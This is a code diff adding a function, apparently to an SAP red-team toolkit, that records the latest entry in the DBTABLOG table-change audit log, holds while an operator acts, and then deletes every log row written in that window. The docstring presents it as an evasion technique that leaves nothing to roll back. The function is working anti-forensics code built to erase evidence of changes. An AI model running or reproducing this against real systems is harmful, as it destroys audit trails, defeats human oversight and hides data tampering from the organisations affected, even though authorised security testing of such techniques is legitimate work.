@@ -1277,3 +1277,101 @@ def tier3_java_sal_suppress(state, node,
         restore_fail=restore.get("suppress_fail", 0),
         restored_count=restored_count,
         baseline_count=len(baseline_cats))
+
+
+# ---------------------------------------------------------------------------
+# DBTABLOG post-hoc purge (Approach C)
+# ---------------------------------------------------------------------------
+
+def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
+                          tabname_filter=None) -> dict:
+    """Post-hoc purge of DBTABLOG entries written during the hold window.
+
+    Strategy: capture ``MAX(LOGID)`` baseline, let logging run normally
+    for ``hold_seconds`` (operator drives their actions during this
+    window), then ``DELETE FROM DBTABLOG WHERE LOGID > baseline``
+    (optionally narrowed by a tabname whitelist).
+
+    Why this is preferable to the DDIC mutation approaches:
+      * DBTABLOG is delivery class ``L`` and is itself NOT logged, so
+        the DELETE doesn't recurse.
+      * No DD09L touch, no DDIF_TABL_ACTIVATE, no transport object.
+      * Restore is a no-op — no state was changed; nothing to roll back.
+
+    Self-managed baseline — gate is called with ``require_baseline=False``
+    because the DBTABLOG LOGID baseline is technique-specific and lives
+    in the result dict, not in the global ``BaselineSnapshot``.
+    """
+    import time as _time
+    technique = "dbtablog_purge"
+    try:
+        assert_evasion_allowed(state, node, technique,
+                                require_baseline=False)
+    except EvasionGateError as e:
+        return _wrap_result(technique, False, error=str(e))
+
+    if "ABAP" not in (getattr(node, "system_type", "") or "").upper():
+        return _wrap_result(technique, False,
+                             error="not an ABAP system")
+
+    sid = getattr(node, "sid", "?")
+    tabs = list(tabname_filter or [])
+
+    from sap_dbtablog_purge import read_max_logid, purge_dbtablog
+
+    # Step 1 — baseline.
+    print(f"[*] {sid}: reading DBTABLOG baseline (MAX LOGID) …")
+    base = read_max_logid(node)
+    if not base["ok"]:
+        return _wrap_result(technique, False,
+                             error=f"baseline read failed: "
+                                    f"{base.get('error', '?')}")
+    baseline_logid = base["baseline"]
+    print(f"[+] {sid}: baseline LOGID = {baseline_logid!r}")
+    if not baseline_logid:
+        print(f"[!] {sid}: DBTABLOG is empty — purge will catch every "
+              f"row written in the hold window")
+
+    # Step 2 — hold (operator runs actions here).
+    if hold_seconds > 0:
+        scope = (f"tables={','.join(tabs)}" if tabs
+                 else "scope=all tables")
+        print(f"[*] {sid}: holding for {hold_seconds}s — operator "
+              f"actions in this window will be purged ({scope}) …")
+        _time.sleep(max(0.0, float(hold_seconds)))
+
+    # Step 3 — purge.
+    if tabs:
+        print(f"[*] {sid}: purging DBTABLOG WHERE LOGID > baseline "
+              f"AND TABNAME IN {tabs} …")
+    else:
+        print(f"[*] {sid}: purging DBTABLOG WHERE LOGID > baseline "
+              f"(all tables) …")
+    purge = purge_dbtablog(node, baseline_logid, tabname_filter=tabs)
+    if not purge["ok"]:
+        return _wrap_result(technique, False,
+                             error=f"purge failed: "
+                                    f"{purge.get('error', '?')}",
+                             baseline_logid=baseline_logid)
+
+    deleted = purge["deleted_count"]
+    print(f"[+] {sid}: DBTABLOG purged — {deleted} row(s) deleted, "
+          f"{purge['remaining_count']} remaining post-baseline")
+
+    try:
+        from sapmap_findings import emit_finding
+        scope_txt = (f" (tables: {','.join(tabs)})" if tabs else "")
+        emit_finding(
+            "INFO", sid,
+            f"Tier 3: DBTABLOG purged — {deleted} entries deleted "
+            f"(LOGID > {baseline_logid}){scope_txt}")
+    except Exception:
+        pass
+
+    return _wrap_result(
+        technique, True,
+        baseline_logid=baseline_logid,
+        deleted_count=deleted,
+        remaining_count=purge["remaining_count"],
+        tabname_filter=tabs,
+        hold_seconds=hold_seconds)
